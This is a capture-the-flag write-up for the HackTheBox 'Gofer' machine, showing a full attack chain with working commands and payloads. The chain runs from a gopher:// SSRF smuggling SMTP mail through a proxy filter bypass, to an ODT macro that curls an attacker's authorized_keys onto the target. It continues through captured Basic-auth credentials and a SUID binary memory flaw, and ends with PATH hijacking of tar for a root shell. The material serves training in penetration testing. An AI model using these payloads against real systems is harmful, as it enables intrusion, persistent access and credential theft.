## [HackTheBox Write-Up: Gofer][Hard]

### Introduction

In today's write-up, we'll delve into the Gofer machine from HackTheBox. The machine provides a fascinating journey through various vulnerabilities, emphasizing the importance of keen observation, thorough enumeration, and the versatility of skills required in penetration testing.
Initial Reconnaissance

The adventure commenced with a standard nmap scan against the IP 10.10.11.225. The scan revealed several open ports, with services like SSH, Apache, and Samba running.

```
# Nmap 7.94 scan initiated Sun Jul 30 03:01:59 2023 as: nmap -sC -sV -oN nmap gofer.htb
Nmap scan report for gofer.htb (10.10.11.225)
Host is up (0.14s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)
|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)
|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Gofer
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-29T19:02:56
|_  start_date: N/A
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 30 03:03:02 2023 -- 1 IP address (1 host up) scanned in 63.11 seconds
```

The initial exploration of the web server didn't yield significant findings, except for an "About Us" section that listed team names and their roles—a detail that would come in handy later.

#### Gaining Initial Access

Our attention turned to the Samba shares. It was open for anonymous login, revealing a .backup directory and a "mail" file within. This file contained an email that provided valuable insights into the internal communication of the team and hinted at potential vulnerabilities related to file formats and the web proxy.

```
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

#### Exploiting the Web Proxy
From the contents of the intercepted email, the potential for exploiting the Gopher protocol became evident. The goal was to utilize this protocol to dispatch an SMTP message directly to the internal port 25. This intricately crafted message was designed to house a link, leading to an .odt file. Hidden within this file was a meticulously designed Remote Code Execution (RCE) vulnerability.

To shed more light on potential entry points, a systematic subdomain fuzzing was initiated using ffuf. The command executed was:
```
ffuf -w $/wordlists/dns/subdomains.txt -u http://10.10.11.225 -H 'Host: FUZZ.gofer.htb' -mc all -fw 20
```

This diligent search revealed the proxy.gofer.htb subdomain. However, initial attempts to engage with the proxy using the GET method were met with staunch resistance - the response was an unwavering "unauthorized". It was at this juncture that a misconfiguration related to <Limit> was identified and exploited. By switching to a POST method, we were able to navigate past this roadblock.

Yet another challenge presented itself when attempts to reference localhost using the standard 127.0.0.1, localhost, or even the abbreviated 127 were blocked — all of these were on the blacklist. But every system has a chink in its armor. In this case, it was the overlooked representation of localhost as 0. Using this representation, we successfully bypassed the filter, leading to the crafting and deployment of the final payload.

```
gopher://0:25/_MAIL FROM:<jdavis@gofer.htb>
RCPT To:<jhudson@gofer.htb>
DATA
From:jdavis@gofer.htb
Subject:Client Docs
Message:<a href="http://10.10.14.27:8080/rce.odt>clients.odt</a>
.
```
Dispatching the request
```
POST /index.php?url=gopher%3a//0%3a25/_MAIL%2520FROM%3a<jdavis%2540gofer.htb>%250ARCPT%2520To%3a<jhudson%2540gofer.htb>%250ADATA%250AFrom%3ajdavis%2540gofer.htb%250ASubject%3aClient%2520Docs%250AMessage%3a%253Ca%2520href%253D%2522http%3a//10.10.14.27%3a8080/rce.odt%253Eclients.odt%253C/a%253E%250A. HTTP/1.1
Host: proxy.gofer.htb
```
_We also used ffuf to uncover `index.php` endpoint and it's `url` parameter_

#### Crafting the Malicious ODT Document
Given the preference for .odt documents (as per the email), the next logical step was to create a malicious document that would allow for further exploitation. Using LibreOffice, an .odt document was crafted with a macro. The embedded macro was designed to fetch an authorized_keys file from an external server and place it into the jhudson user's SSH directory, potentially granting us SSH access to the machine using our public key.

#### Macro Details
The embedded macro within the .odt document is as follows:
```
Sub Main
 Shell("curl http://10.10.14.27:8081/authorized_keys -o /home/jhudson/.ssh/authorized_keys")
End Sub
```
This script, when executed, will reach out to our server at http://10.10.14.27:8081/ to fetch the authorized_keys file. This file contains the public SSH key of the attacker. By placing this key into the jhudson user's .ssh directory, it allows the attacker to SSH into the machine as the jhudson user without needing a password.

### Privilege Escalation

#### Analyzing the System with linpeas.sh

Once inside the machine as the jhudson user, the next goal was to escalate privileges. For this, linpeas.sh was used, a popular script that checks for potential paths to escalate privileges on Linux systems. While the script provided multiple points of interest, one particular finding stood out: the presence of tcpdump on the system.


#### Capturing Network Traffic with tcpdump

Leveraging the tcpdump utility, network traffic was captured to observe any interesting or revealing information. Among the traffic, a notable HTTP request was observed:
```
GET /index.php?url= HTTP/1.1
Host: proxy.gofer.htb
Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
```
The Authorization header contained a Base64-encoded value.

#### Decoding Credentials

Decoding the Base64 value dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk= revealed credentials in the format username:password, which turned out to be Tom's (tbuckley) credentials.

#### SSH as Tom

Using Tom's credentials, another SSH login attempt was made:
```
ssh tbuckley@gofer.htb
```
_It's noteworthy that while the previously compromised user, jhudson, had access to the machine, they lacked the necessary privileges to execute certain binaries. This made escalating to tbuckley essential, as it provided the required permissions._


### Unknown SUID Binary Exploitation & Privilege Escalation to Root

#### Discovering the Binary

Upon gaining access as tbuckley, further enumeration revealed an intriguing SUID binary located at /usr/local/bin/notes. The SUID bit set on a binary means that when the binary is executed, it runs as the owner of the file (in this case, root) rather than the user who ran it. This is a potential vector for privilege escalation if the binary can be exploited.

The file permissions were particularly interesting:
```
-rwsr-s--- 1 root dev 17K Apr 28 16:06 /usr/local/bin/notes
```
The notes binary was owned by root and had the SUID bit set, but it was also executable by members of the dev group. Since tbuckley was a member of this group, it meant that the binary could be executed with root privileges.

#### Exploring the binary
```
User
tbuckley@gofer:~$ /usr/local/bin/notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice:
```

#### Reversing the binary
```
void main(void)

{
  __uid_t _Var1;
  int iVar2;
  undefined4 local_1c;
  void *local_18;
  void *local_10;
  
  local_1c = 0;
  local_10 = (void *)0x0;
  local_18 = (void *)0x0;
  do {
    puts(
        "========================================\n1) Create an user and choose an username\n2) Show user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\n\n"
        );
    printf("Your choice: ");
    __isoc99_scanf(&DAT_0010212b,&local_1c);
    puts("");
    switch(local_1c) {
    default:
                    // WARNING: Subroutine does not return
      exit(0);
    case 1:
      local_10 = malloc(0x28);
      if (local_10 == (void *)0x0) {
                    // WARNING: Subroutine does not return
        exit(-1);
      }
      memset(local_10,0,0x18);
      memset((void *)((long)local_10 + 0x18),0,0x10);
      _Var1 = getuid();
      if (_Var1 == 0) {
        *(undefined4 *)((long)local_10 + 0x18) = 0x696d6461;
        *(undefined *)((long)local_10 + 0x1c) = 0x6e;
      }
      else {
        *(undefined4 *)((long)local_10 + 0x18) = 0x72657375;
      }
      printf("Choose an username: ");
      __isoc99_scanf(&DAT_00102144,local_10);
      puts("");
      break;
    case 2:
      if (local_10 == (void *)0x0) {
        puts("First create an user!\n");
      }
      else {
        printf("\nUsername: %s\n",local_10);
        printf("Role: %s\n\n",(long)local_10 + 0x18);
      }
      break;
    case 3:
      if (local_10 != (void *)0x0) {
        free(local_10);
      }
      break;
    case 4:
      local_18 = malloc(0x28);
      memset(local_18,0,0x28);
      if (local_18 == (void *)0x0) {
                    // WARNING: Subroutine does not return
        exit(-1);
      }
      puts("Write your note:");
      __isoc99_scanf(&DAT_0010218b,local_18);
      break;
    case 5:
      printf("Note: %s\n\n",local_18);
      break;
    case 6:
      puts("Coming soon!\n");
      break;
    case 7:
      if (local_18 != (void *)0x0) {
        free(local_18);
        local_18 = (void *)0x0;
      }
      break;
    case 8:
      if (local_10 == (void *)0x0) {
        puts("First create an user!\n");
      }
      else {
        iVar2 = strcmp((char *)((long)local_10 + 0x18),"admin");
        if (iVar2 == 0) {
          puts("Access granted!");
          setuid(0);
          setgid(0);
          system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
        }
        else {
          puts("Access denied: you don\'t have the admin role!\n");
        }
      }
    }
  } while( true );
}
```

We can observe several potential vulnerabilities and logic flaws that might be exploitable:

- **Buffer Overflow to Set Role**
- **Exploit the Backup Function**

Once our role is "admin", the "Backup notes" option will execute the tar command as root. If we can influence the path we might be able to exploit tar to gain a root shell.

#### Exploiting Buffer Overflow in Note Creation
From the reversed binary, it was evident that the program has a buffer overflow vulnerability when creating a note. This was exploited by providing an overly long note input that spills over into the adjacent memory storing the user's role. 

  - create a user
  - delete a user
  - create a note: AAAAAAAAAAAAAAAAAAAAAAAAadmin

We effectively set our role as "admin".

  - backup notes
  - exit 

#### Command Hijacking via PATH Manipulation

With the role set to "admin", the next goal was to exploit the "Backup notes" option that uses the tar command via a system call. To exploit this, a malicious tar script was crafted to execute a bash shell:
```
#!/bin/bash
/bin/bash
```

Next, the PATH environment variable was updated to prioritize the directory containing the malicious `tar` script. When the "Backup notes" option was chosen, instead of executing the actual `tar` command, the system executed our malicious script, granting us a root shell.

This marked the complete compromise of the "Gofer" machine, from initial access to full system control.


### Conclusion

The journey through the "Gofer" machine on HackTheBox was a testament to the importance of thorough enumeration, understanding system internals, and leveraging even the smallest vulnerabilities to achieve the end goal. From leveraging an email for initial access to exploiting a custom binary, it showcased the need for a versatile skill set in penetration testing.